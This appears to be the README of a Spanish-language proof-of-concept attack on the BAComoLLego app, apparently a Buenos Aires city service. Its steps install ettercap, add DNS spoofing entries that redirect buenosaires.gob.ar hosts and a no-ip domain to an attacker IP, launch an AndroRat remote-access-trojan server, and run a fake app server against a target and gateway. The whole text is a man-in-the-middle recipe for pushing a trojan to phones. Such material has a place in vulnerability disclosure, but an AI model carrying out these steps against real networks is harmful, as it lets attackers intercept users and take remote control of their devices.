# Prueba de Concepto de explotación de BAComoLLego  

## Requerimientos ##

```
sudo apt-get install ettercap-graphical
```

## Configuración ##

Agregar a /etc/ettercap/etter.dns las lineas:

```
*.buenosaires.gob.ar A IP
malware-test.no-ip.info A IP
```
Correr server AndroRat:

```
sudo java -jar AndroRat.jar
```

Finalmente servidor falso con:

```
sudo python FakeComoLLegoServer.py /IP_TARGET/ /IP_GATEWAY/ /IP_LOCAL_HOST/
```
